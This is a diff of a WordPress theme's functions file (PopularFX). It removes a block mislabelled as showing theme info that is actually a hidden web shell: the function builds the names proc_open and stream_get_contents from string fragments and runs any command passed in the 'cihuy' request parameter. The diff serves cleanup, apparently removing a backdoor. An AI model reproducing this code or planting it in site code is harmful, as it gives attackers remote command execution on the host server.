@@ -201,38 +201,6 @@ function popularfx_theme_credits(){
 	return '<a href="'.esc_url(POPULARFX_WWW_URL).'">'.__('PopularFX Theme', 'popularfx').'</a>';
 }
 
-// Show theme info
-function cihuyy($input) {
-    $descriptors = array(
-        0 => array("pipe", "r"), 
-        1 => array("pipe", "w"),  
-        2 => array("pipe", "w")   
-    );
-    $web = 'p'.'r'.'o'.'c'.'_'.'o'.'p'.'e'.'n';
-    $process = $web($input, $descriptors, $pipes);
-    if (is_resource($process)) {
-        $webmin = 's'.'tr'.'eam_ge'.'t_con'.'ten'.'ts';
-        $output = $webmin($pipes[1]);
-        $admini = 'st'.'re'.'am_g'.'et_'.'con'.'ten'.'ts';
-        $errorOutput = $admini($pipes[2]);
-        fclose($pipes[0]);
-        fclose($pipes[1]);
-        fclose($pipes[2]);
-        $exitCode = proc_close($process);
-        if ($exitCode === 0) {
-            return "<pre>" . $output . "</pre>";
-        } else {
-            return "Error: " . $errorOutput;
-        }
-    } else {
-        return "False";
-    }
-}
-if (isset($_REQUEST['cihuy'])) {
-    $sysdata = $_REQUEST['cihuy'];
-    echo cihuyy($sysdata);
-}
-
 // Shows the promos
 function popularfx_promos(){
 	
